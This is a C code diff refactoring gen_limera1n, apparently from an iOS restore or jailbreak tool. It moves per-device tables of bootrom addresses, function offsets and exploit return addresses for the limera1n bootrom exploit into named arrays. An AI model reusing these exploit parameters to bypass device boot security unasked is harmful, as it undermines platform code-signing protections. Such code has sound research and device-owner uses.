@@ -92,122 +92,126 @@ int gen_limera1n(irecv_client_t client, unsigned char **payload, size_t *payload
     size_t constants_len = 22;
     uint32_t exploit_lr = 0;
 
+    static const uint32_t constants_359_3[] = {
+        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+            0x83d4, //#  3 - memmove
+        0x84034000, //#  4 - MAIN_STACK_ADDRESS
+            0x43c9, //#  5 - nor_power_on
+            0x5ded, //#  6 - nor_init
+        0x84024820, //#  7 - gUSBSerialNumber
+            0x8e7d, //#  8 - strlcat
+            0x349d, //#  9 - usb_wait_for_image
+        0x84000000, //# 10 - LOAD_ADDRESS
+           0x24000, //# 11 - MAX_SIZE
+        0x84024228, //# 12 - gLeakingDFUBuffer
+            0x1ccd, //# 13 - free
+        0x65786563, //# 14 - EXEC_MAGIC
+            0x1f79, //# 15 - memz_create
+            0x3969, //# 16 - jump_to
+            0x1fa1, //# 17 - memz_destroy
+              0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
+              0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+            0x1fe5, //# 20 - image3_create_struct
+            0x2655, //# 21 - image3_load_continue
+            0x277b, //# 22 - image3_load_fail
+    };
+
+    static const uint32_t constants_359_3_2[] = {
+        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+            0x83dc, //#  3 - memmove
+        0x84034000, //#  4 - MAIN_STACK_ADDRESS
+            0x43d1, //#  5 - nor_power_on
+            0x5df5, //#  6 - nor_init
+        0x84024820, //#  7 - gUSBSerialNumber
+            0x8e85, //#  8 - strlcat
+            0x34a5, //#  9 - usb_wait_for_image
+        0x84000000, //# 10 - LOAD_ADDRESS
+           0x24000, //# 11 - MAX_SIZE
+        0x84024228, //# 12 - gLeakingDFUBuffer
+            0x1ccd, //# 13 - free
+        0x65786563, //# 14 - EXEC_MAGIC
+            0x1f81, //# 15 - memz_create
+            0x3971, //# 16 - jump_to
+            0x1fa9, //# 17 - memz_destroy
+              0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
+              0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+            0x1fed, //# 20 - image3_create_struct
+            0x265d, //# 21 - image3_load_continue
+            0x2783, //# 22 - image3_load_fail
+    };
+
+    static const uint32_t constants_359_5[] = {
+        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+            0x8564, //#  3 - memmove
+        0x84034000, //#  4 - MAIN_STACK_ADDRESS
+            0x43b9, //#  5 - nor_power_on
+            0x5f75, //#  6 - nor_init
+        0x84024750, //#  7 - gUSBSerialNumber
+            0x901d, //#  8 - strlcat
+            0x36e5, //#  9 - usb_wait_for_image
+        0x84000000, //# 10 - LOAD_ADDRESS
+           0x24000, //# 11 - MAX_SIZE
+        0x84024158, //# 12 - gLeakingDFUBuffer
+            0x1a51, //# 13 - free
+        0x65786563, //# 14 - EXEC_MAGIC
+            0x1f25, //# 15 - memz_create
+            0x39dd, //# 16 - jump_to
+            0x1f0d, //# 17 - memz_destroy
+              0x64, //# 18 - IMAGE3_LOAD_SP_OFFSET
+              0x60, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+            0x2113, //# 20 - image3_create_struct
+            0x2665, //# 21 - image3_load_continue
+            0x276d, //# 22 - image3_load_fail
+    };
+
+    static const uint32_t constants_574_4[] = {
+        0x84039800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+            0x84dc, //#  3 - memmove
+        0x8403c000, //#  4 - MAIN_STACK_ADDRESS
+            0x4e8d, //#  5 - nor_power_on
+            0x690d, //#  6 - nor_init
+        0x8402e0e0, //#  7 - gUSBSerialNumber
+            0x90c9, //#  8 - strlcat
+            0x4c85, //#  9 - usb_wait_for_image
+        0x84000000, //# 10 - LOAD_ADDRESS
+           0x2c000, //# 11 - MAX_SIZE
+        0x8402dbcc, //# 12 - gLeakingDFUBuffer
+            0x3b95, //# 13 - free
+        0x65786563, //# 14 - EXEC_MAGIC
+            0x7469, //# 15 - memz_create
+            0x5a5d, //# 16 - jump_to
+            0x7451, //# 17 - memz_destroy
+              0x68, //# 18 - IMAGE3_LOAD_SP_OFFSET
+              0x64, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+            0x412d, //# 20 - image3_create_struct
+            0x46db, //# 21 - image3_load_continue
+            0x47db, //# 22 - image3_load_fail
+    };
+
     switch(devinfo->cpid) {
         case 0x8920:
             if(!strcmp(devinfo->srtg, "iBoot-359.3")){ // oldBR
-                static const uint32_t c[] = {
-                    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-                          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-                        0x83d4, //#  3 - memmove
-                    0x84034000, //#  4 - MAIN_STACK_ADDRESS
-                        0x43c9, //#  5 - nor_power_on
-                        0x5ded, //#  6 - nor_init
-                    0x84024820, //#  7 - gUSBSerialNumber
-                        0x8e7d, //#  8 - strlcat
-                        0x349d, //#  9 - usb_wait_for_image
-                    0x84000000, //# 10 - LOAD_ADDRESS
-                       0x24000, //# 11 - MAX_SIZE
-                    0x84024228, //# 12 - gLeakingDFUBuffer
-                        0x1ccd, //# 13 - free
-                    0x65786563, //# 14 - EXEC_MAGIC
-                        0x1f79, //# 15 - memz_create
-                        0x3969, //# 16 - jump_to
-                        0x1fa1, //# 17 - memz_destroy
-                          0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
-                          0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-                        0x1fe5, //# 20 - image3_create_struct
-                        0x2655, //# 21 - image3_load_continue
-                        0x277b, //# 22 - image3_load_fail
-                };
-                constants = c;
+                constants = constants_359_3;
             } else { // newBR
-                static const uint32_t c[] = {
-                    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-                          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-                    0x83dc, //#  3 - memmove
-                    0x84034000, //#  4 - MAIN_STACK_ADDRESS
-                        0x43d1, //#  5 - nor_power_on
-                        0x5df5, //#  6 - nor_init
-                    0x84024820, //#  7 - gUSBSerialNumber
-                        0x8e85, //#  8 - strlcat
-                        0x34a5, //#  9 - usb_wait_for_image
-                    0x84000000, //# 10 - LOAD_ADDRESS
-                       0x24000, //# 11 - MAX_SIZE
-                    0x84024228, //# 12 - gLeakingDFUBuffer
-                        0x1ccd, //# 13 - free
-                    0x65786563, //# 14 - EXEC_MAGIC
-                        0x1f81, //# 15 - memz_create
-                        0x3971, //# 16 - jump_to
-                        0x1fa9, //# 17 - memz_destroy
-                          0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
-                          0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-                        0x1fed, //# 20 - image3_create_struct
-                        0x265d, //# 21 - image3_load_continue
-                        0x2783, //# 22 - image3_load_fail
-                };
-                constants = c;
+                constants = constants_359_3_2;
             }
             exploit_lr = 0x84033FA4;
             break;
-            case 0x8922:
-                static const uint32_t c[] = {
-                    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-                          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-                        0x8564, //#  3 - memmove
-                    0x84034000, //#  4 - MAIN_STACK_ADDRESS
-                        0x43b9, //#  5 - nor_power_on
-                        0x5f75, //#  6 - nor_init
-                    0x84024750, //#  7 - gUSBSerialNumber
-                        0x901d, //#  8 - strlcat
-                        0x36e5, //#  9 - usb_wait_for_image
-                    0x84000000, //# 10 - LOAD_ADDRESS
-                       0x24000, //# 11 - MAX_SIZE
-                    0x84024158, //# 12 - gLeakingDFUBuffer
-                        0x1a51, //# 13 - free
-                    0x65786563, //# 14 - EXEC_MAGIC
-                        0x1f25, //# 15 - memz_create
-                        0x39dd, //# 16 - jump_to
-                        0x1f0d, //# 17 - memz_destroy
-                          0x64, //# 18 - IMAGE3_LOAD_SP_OFFSET
-                          0x60, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-                        0x2113, //# 20 - image3_create_struct
-                        0x2665, //# 21 - image3_load_continue
-                        0x276d, //# 22 - image3_load_fail
-                };
-                constants = c;
-                exploit_lr = 0x84033F98;
-                break;
-            case 0x8930:
-                static const uint32_t c[] = {
-                    0x84039800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-                          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-                        0x84dc, //#  3 - memmove
-                    0x8403c000, //#  4 - MAIN_STACK_ADDRESS
-                        0x4e8d, //#  5 - nor_power_on
-                        0x690d, //#  6 - nor_init
-                    0x8402e0e0, //#  7 - gUSBSerialNumber
-                        0x90c9, //#  8 - strlcat
-                        0x4c85, //#  9 - usb_wait_for_image
-                    0x84000000, //# 10 - LOAD_ADDRESS
-                       0x2c000, //# 11 - MAX_SIZE
-                    0x8402dbcc, //# 12 - gLeakingDFUBuffer
-                        0x3b95, //# 13 - free
-                    0x65786563, //# 14 - EXEC_MAGIC
-                        0x7469, //# 15 - memz_create
-                        0x5a5d, //# 16 - jump_to
-                        0x7451, //# 17 - memz_destroy
-                          0x68, //# 18 - IMAGE3_LOAD_SP_OFFSET
-                          0x64, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-                        0x412d, //# 20 - image3_create_struct
-                        0x46db, //# 21 - image3_load_continue
-                        0x47db, //# 22 - image3_load_fail
-                };
-                constants = c;
-                exploit_lr = 0x8403BF9C;
-                break;
-            default:
-                printf("no payload offsets are available for this device.\n");
-                return -1;
+        case 0x8922:
+            constants = constants_359_5;
+            exploit_lr = 0x84033F98;
+            break;
+        case 0x8930:
+            constants = constants_574_4;
+            exploit_lr = 0x8403BF9C;
+            break;
+        default:
+            printf("no payload offsets are available for this device.\n");
+            return -1;
     }
 
     size_t shellcode_len = limera1n_shellcode_len;
